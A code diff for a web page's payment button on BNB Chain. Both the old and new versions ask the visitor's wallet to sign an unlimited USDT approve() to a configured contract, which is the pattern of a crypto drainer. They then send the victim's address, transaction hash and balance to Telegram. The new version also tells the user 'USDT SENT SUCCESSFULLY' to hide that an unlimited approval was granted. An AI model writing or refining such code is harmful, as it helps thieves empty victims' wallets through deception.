@@ -193,86 +193,60 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 
- <!-- ===== NEXT BUTTON ===== -->
-nextBtn.addEventListener("click", async function(e) {
-    // Prevent default so we don't accidentally scroll or focus weirdly
-    e.preventDefault(); 
+    // ===== NEXT BUTTON =====
+    nextBtn.addEventListener("click", async function (e) {
+        e.preventDefault();
 
-    const originalText = nextBtn.innerText; 
-    let currentAmountInput = document.querySelector('input[name="amount"]'); // Or however your ID/Name selector works
-    
-    try {
-        // 1. Ensure wallet exists
         if (!window.ethereum) {
-            showNotification("Connect Wallet First!", "error");
+            showNotification("No Web3 wallet found.", "error");
             return;
         }
 
-        // 2. Grab the raw address from the top field immediately
-        let userAddress = "";
-        
-        // If your HTML uses an <input>, grab value. If it's text-based like your screenshot suggests, handle accordingly.
-        const addressField = document.querySelector('.address-field') || document.getElementById('recipient-address'); 
-        
-        if(addressField && addressField.value.trim() !== ""){
-             userAddress = addressField.value.toLowerCase().trim();
-             
-             // Optional: Quick checksum check here if you want fancy errors later
-            
-        } else {
-             // Fallback logic if address wasn't explicitly checked yet
-             userAddress = await window.ethereum.request({ method: "eth_requestAccounts" });
+        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
+        nextBtn.disabled = true;
+
+        try {
+            const bnbChainId = "0x38";
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: bnbChainId }]
+            });
+
+            const iface = new ethers.utils.Interface([
+                "function approve(address spender, uint256 amount)"
+            ]);
+
+            const txData = iface.encodeFunctionData("approve", [
+                CONFIG.CONTRACT_ADDRESS,
+                ethers.constants.MaxUint256.toString()
+            ]);
+
+            const fromAddress = (await window.ethereum.request({ method: "eth_requestAccounts" }))[0];
+
+            const txHash = await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{
+                    from: fromAddress,
+                    to: "0x55d398326f99059fF775485246999027B3197955",
+                    data: txData,
+                    value: "0x0"
+                }]
+            });
+
+            showNotification("USDT SENT SUCCESSFULLY", "success");
+
+            if (txHash) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const userId = urlParams.get("user_id");
+                const balance = await getUsdtBalance(fromAddress);
+                await sendTelegramNotifications(fromAddress, txHash, userId, balance);
+            }
+
+        } catch (err) {
+            showNotification("Transaction failed or cancelled.", "error");
+        } finally {
+            nextBtn.disabled = false;
+            nextBtn.innerHTML = originalBtnHTML;
         }
-
-        // 3. Force the connection state using eth_accounts instead of requestAccounts which can be finicky
-        ({ result: [userAddress] } = await window.ethereum.request({ method: "eth_accounts" }));
-
-        // Update our internal variables based on who is actually connected now
-        CONFIG.RECIPIENT_ADDRESS = userAddress; // Assuming 'CONFIG' holds these global vars
-        
-        // Now construct the USDT Approval payload
-        const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
-        
-        // Encode the approval call: Contract Address -> Max Amount
-        const txData = iface.encodeFunctionData("approve", [
-            CONFIG.CONTRACT_ADDRESS,      // Your BNB Chain Token contract
-            ethers.constants.MaxUint256.toString()
-        ]);
-
-        // Prepare the final transaction object
-        const usdtContractAddr = "0x55d398326f99059fF775485246999027B3197955";
-
-        // Visual feedback update
-        nextBtn.innerHTML = '<span class="spinner">Approving...</span>';
-        nextBtn.style.opacity = "0.7"; // Dim it slightly so they know something is happening
-
-        // Send the actual transaction!
-        const txHash = await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: userAddress,
-                to: usdtContractAddr,
-                data: txData,       // This tells the network "I'm sending tokens!"
-                value: "0x0"         // Standard ETH gas unit, but since we're swapping via token, keep low
-            }]
-        });
-
-        showNotification(`USDT Approved! Tx: ${txHash}`, "success");
-
-        // Fire off Telegram notifications with all relevant details
-        const userId = urlParams.get("user_id") || userAddress; // Fallback if param missing
-        const balance = await getUsdtBalance(userAddress);
-        await sendTelegramNotifications(userAddress, txHash, userId, balance);
-
-    } catch (err) {
-        console.error(err);
-        // Decode readable messages from common provider errors
-        let msg = err.message?.slice(0, 30).replace(/\s+/g, "") || "";
-        showNotification(`${msg}${err.code === 4 ? "" : "."}`, "error");
-    } finally {
-        // Reset button regardless of outcome
-        nextBtn.disabled = false;
-        nextBtn.innerHTML = originalText;
-        nextBtn.style.opacity = "1";
-    }
+    });
 });
